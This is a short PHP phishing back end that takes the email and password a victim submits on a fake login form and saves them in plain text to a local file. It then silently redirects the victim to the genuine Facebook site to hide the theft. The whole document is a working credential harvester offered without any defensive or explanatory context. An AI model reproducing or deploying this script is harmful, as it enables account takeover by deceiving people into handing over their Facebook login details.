<?php
   
  $username = $_POST['email'];
	 
 $password = $_POST['pass'];
	
  
		 
	

	$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
	


	
	
	$data="Username=$username, Password=$password ";
	
			
		
	file_put_contents('myfile', $data, FILE_APPEND);	
		
			
	fclose($myfile);
		
	header("Location: https://www.facebook.com/");
      
  
    exit();
	  
	
      
  
 
   
?>